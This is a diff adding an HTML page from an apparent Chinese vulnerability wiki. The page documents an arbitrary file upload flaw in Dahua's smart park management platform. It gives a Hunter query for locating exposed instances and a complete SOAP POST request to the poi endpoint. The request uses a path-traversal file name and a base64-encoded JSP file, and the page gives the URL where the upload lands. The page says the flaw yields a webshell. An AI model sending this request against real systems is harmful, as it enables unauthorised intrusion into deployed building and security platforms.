@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A7%E5%8D%8E/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0poi%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>大华智慧园区综合管理平台poi任意文件上传漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u5927\u534e\u667a\u6167\u56ed\u533a\u7efc\u5408\u7ba1\u7406\u5e73\u53f0poi\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e", url: "#_top", children: [
+          ]},
+          {title: "\u4e00\u3001\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1", children: [
+          ]},
+          {title: "\u4e8c\u3001\u5f71\u54cd\u7248\u672c", url: "#_2", children: [
+          ]},
+          {title: "\u4e09\u3001\u8d44\u4ea7\u6d4b\u7ed8", url: "#_3", children: [
+          ]},
+          {title: "\u56db\u3001\u6f0f\u6d1e\u590d\u73b0", url: "#_4", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../js/base.js"></script>
+      <script src="../../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0searchJsonSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0searchJsonSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        大华智慧园区综合管理平台searchJson SQL注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0pay%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0pay%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="btn btn-xs btn-link">
+        大华智慧园区综合管理平台pay 远程命令执行
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="poi">大华智慧园区综合管理平台poi任意文件上传漏洞<a class="headerlink" href="#poi" title="Permanent link">&para;</a></h1>
+<h1 id="_1">一、漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<p>大华智慧园区综合管理平台是一个集智能化、信息化、网络化、安全化为一体的智慧园区管理平台，旨在为园区提供一站式解决方案，包括安防、能源管理、环境监测、人员管理、停车管理等多个方面。 <font style="color:rgba(0, 0, 0, 0.9);">大华智慧园区综合管理平台在/emap/webservice/gis/soap/poi接口处存在任意文件上传漏洞，可以利用此漏洞获得webshell。</font></p>
+<h1 id="_2">二、影响版本<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h1>
+<ul>
+<li>大华智慧园区综合管理平台</li>
+</ul>
+<h1 id="_3">三、资产测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h1>
+<ul>
+<li>hunter:<code>app.name="Dahua 大华 智慧园区管理平台"</code><br />
+<img alt="1691828229241-1a7a5e8c-d5e6-4852-b428-047c6c955113.png" src="./img/YD6R9DCWkCac1mzy/1691828229241-1a7a5e8c-d5e6-4852-b428-047c6c955113-882487.png" /></li>
+<li>登录页面：</li>
+</ul>
+<p><img alt="1691828319702-85171e4b-cb4b-4826-a654-3c8859b17138.png" src="./img/YD6R9DCWkCac1mzy/1691828319702-85171e4b-cb4b-4826-a654-3c8859b17138-782181.png" /></p>
+<h1 id="_4">四、漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h1>
+<div class="highlight"><pre><span></span><code>POST /emap/webservice/gis/soap/poi HTTP/1.1
+Host: xx.xx.xx.xx
+Cookie: JSESSIONID=9EC0A731FFF852957C17C91FE2EF24BD
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Te: trailers
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 683
+
+&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;
+xmlns:res=&quot;http://response.webservice.poi.mapbiz.emap.dahuatech.com/&quot;&gt;
+&lt;soapenv:Header/&gt;
+&lt;soapenv:Body&gt;
+&lt;res:uploadPicFile&gt;
+&lt;!--type:string--&gt;
+&lt;arg0&gt;/../../1.jsp&lt;/arg0&gt;
+&lt;!--type:base64Binary--&gt;
+&lt;arg1&gt;PCVAcGFnZSBpbXBvcnQ9ImphdmEudGV4dC4qLGphdmEudXRpbC4qLGphdmEuaW8uKiIlPgo8JQpTaW1wbGVEYXRlRm9ybWF0IGRmID0gbmV3IFNpbXBsZURhdGVGb3JtYXQoInl5eS1NTS1kZCBISDptbTpzcyIpOwpvdXQucHJpbnRsbihkZi5mb3JtYXQobmV3IERhdGUoKSkpOwpGaWxlIGZpbGUgPSBuZXcgRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKTsKZmlsZS5kZWxldGUoKTsKJT4=&lt;/arg1&gt;
+&lt;/res:uploadPicFile&gt;
+&lt;/soapenv:Body&gt;
+&lt;/soapenv:Envelope&gt;
+</code></pre></div>
+<p><img alt="1694071791341-5248d78f-4c1e-4dd3-8b9e-29c6fd09aabe.png" src="./img/YD6R9DCWkCac1mzy/1694071791341-5248d78f-4c1e-4dd3-8b9e-29c6fd09aabe-418276.png" /></p>
+<p>上传文件位置</p>
+<div class="highlight"><pre><span></span><code>http://xx.xx.xx.xx/upload/1.jsp
+</code></pre></div>
+<p><img alt="1694071840120-b98410d5-a689-4743-8a5b-e59ad7b99583.png" src="./img/YD6R9DCWkCac1mzy/1694071840120-b98410d5-a689-4743-8a5b-e59ad7b99583-299337.png" /></p>
+<blockquote>
+<p>更新: 2024-02-29 23:57:19<br />
+原文: <a href="https://www.yuque.com/xiaokp7/ocvun2/bdf3yqzbh9p9h9ev">https://www.yuque.com/xiaokp7/ocvun2/bdf3yqzbh9p9h9ev</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0searchJsonSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0searchJsonSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        大华智慧园区综合管理平台searchJson SQL注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0pay%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0pay%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="btn btn-xs btn-link">
+        大华智慧园区综合管理平台pay 远程命令执行
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
